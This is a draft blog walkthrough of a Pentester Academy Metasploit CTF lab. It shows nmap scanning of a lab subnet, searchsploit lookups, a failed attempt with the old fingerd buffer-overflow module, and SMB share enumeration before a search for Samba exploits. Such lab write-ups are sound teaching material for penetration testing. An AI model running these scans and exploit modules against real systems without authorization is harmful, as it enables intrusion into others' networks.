+++
author = "Nick"
date = 2019-12-31T19:36:14Z
description = ""
draft = true
slug = "attacked-defense-metasploit-ctf-4"
title = "Attacked | Defense - Metasploit CTF 4"

+++


Welcome back to the third entry in this series. In the last entry we used two `Metasploit` modules to obtain `Tomcat` credentials and leverage them with an authenticated RCE.

## Overview
In this entry we will tackle the third Metasploit CTF on Pentester Academy. In this entry we will use two `Metasploit` modules. A module to test for valid user credentials and an authenticated RCE.

## Network Topology

{{< figure src="__GHOST_URL__/content/images/2020/01/PA_MCTF_1.png" >}}

## Enumeration
Like the previous CTF's we've done. We now know that we'll start every CTF off with an `nmap` scan.

Command:
`nmap -sC -sV -T5 -p- 192.213.205.1/24`

We see a new flag added to our `nmap` scan. We've added `-sC` for use default scripts. This will use some of the default scripts that are packaged with `nmap` to help further enumerate services.

With these CTF's, and most CTF's in general, we know what our target's IP's will be but we want to maintain the practice of enumerating the entire network.

Here are our `nmap` scan results:
```
Nmap scan report for target-1 (192.213.205.3)
Host is up (0.000035s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE     VERSION
79/tcp  open  finger      Linux fingerd
|_finger: No one logged on.\x0D
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: METASPLOIT CTF)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: METASPLOIT CTF)
MAC Address: 02:42:C0:D5:CD:03 (Unknown)
Service Info: Host: METASPLOIT-CTF; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOIT-CTF, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
|   NetBIOS computer name: METASPLOIT-CTF\x00
|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2020-01-01T19:42:07+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-01 19:42:07
|_  start_date: N/A

Nmap scan report for target-2 (192.213.205.4)
Host is up (0.000035s latency).
All 65535 scanned ports on target-2 (192.213.205.4) are closed
MAC Address: 02:42:C0:D5:CD:04 (Unknown)
```

We now have some ports that we've not seen yet. `Target-1` has ports 79, 139, 445. `Target-2` has no ports available. 

Our first `searchsploit` will be for the `fingerd` service.

Command:
`searchsploit fingerd`

We get back a few results, one of which seems to be a `Metasploit` module:

{{< figure src="__GHOST_URL__/content/images/2020/01/searchsploit_fingerd.png" >}}

We will try this module first, if it fails we'll move onto the next service, `SMB`.

We load up the `Metasploit` console.

Command:
`msfdb run` or `msfconsole`

Once we are loaded in we `search` for the module we want to use.

Command:
`msf5> search fingerd`

{{< figure src="__GHOST_URL__/content/images/2020/01/metasploit_fingered.png" >}}

This is a VERY old exploit and not for our target system, but worth a shot anyway since it takes very little time to try it. We select the module for use.

Command:
`msf5> use 1` or `msf5> use exploit/bsd/finger/morris_fingerd_bof`

Inside the module we `show` our `options`. We only have one to set, `rhost`

Command:
`msf5> set rhosts target-1`

We then run our exploit:

`msf5> run` or `msf5> exploit`

The exploit runs but nothing happens. No surprise there! Before we `searchsploit` for `SMB` modules, first we'll want to see if we can list any `SMB` shares on `target-1`. There are a few tools to do this: `smbmap`, `smbclient` and `Metasploit` has a 'few' modules to enumerate as well. Since this is a `Metasploit` oriented CTF, let's use those.

Using the `search` in `Metasploit` for `SMB` will come back with a lot of results. We are after mostly the auxilary modules. These are mostly scanning and enumeration modules.

{{< figure src="__GHOST_URL__/content/images/2020/01/metasploit_smb.png" >}}

We are interested in the `auxilary/scanner/smb/smb_enumshares`. This will show us if there are any open shares we are free to connect to with or without authentication.

Command:
`msf5> use 54` or `msf5> use auxiliary/scanner/smb/smb_enumshares`

Once the module is loaded we `show` our `options`.

{{< figure src="__GHOST_URL__/content/images/2020/01/show_smb_options.png" >}}

We have a few options. THe only one we want to set is `rhosts` currently.

Command:
`msf5> set rhosts target-1`

Then `run` the module.

Command:
`msf5> run` or `msf5> exploit`

In this case we had no share show up. Now that we know there are no shares to browse, we'll start looking for vulnerabilities in the service. We will `search` for `samba` exploits.

Command:
`msf5> search samba`

26 modules are returned. We are going to look at the ones that are for Linux since we know from our `nmap` scan that we have Ubuntu running on the target.

{{< figure src="__GHOST_URL__/content/images/2020/01/search_samba.png" >}}



